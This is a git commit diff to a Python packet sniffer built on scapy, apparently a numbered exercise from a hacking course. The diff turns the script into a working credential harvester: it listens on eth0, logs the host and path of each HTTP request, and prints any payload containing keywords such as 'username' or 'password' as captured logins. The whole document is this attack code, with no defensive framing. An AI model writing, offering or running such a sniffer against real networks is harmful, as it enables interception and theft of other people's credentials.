313b2e97c23830f0026c358b6b9696904d494d0a
ashokcu62 <ashokcu62.com>
2023-07-19 02:27:46 -0400

    spoofer-comp

--- 3_packet_sniffer/packet_sniffer.py
+++ 3_packet_sniffer/packet_sniffer.py
@@ -4,10 +4,11 @@ from scapy.layers import http
 def sniff(interface):
     scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet) #can usef filter argument to filter specific ports
 
-def process_sniffed_packet(packet):
-    if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            # print(packet.show())
+def get_url(packet):
+    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+     if packet.haslayer(scapy.Raw):
             load = str(packet[scapy.Raw].load)
            
             keywords = ["username","name","uname","password","pass"] 
@@ -15,11 +16,22 @@ def process_sniffed_packet(packet):
             for keyword in keywords:
 
                 if keyword in load:
-                    print(load)
-                    break
+                    return load                  
                 
 
+def process_sniffed_packet(packet):
+    # print(packet.show())
+    if packet.haslayer(http.HTTPRequest):
+        # print(packet.show())
+        url=get_url(packet)
+        login_info=get_login_info(packet)
+        print("[+] HTTP Request >> ",url)
 
+        if login_info :
+             print("\n\n[+] Uername and password >> "+login_info+"\n\n")
+        
+
+       
 
 sniff("eth0")
 
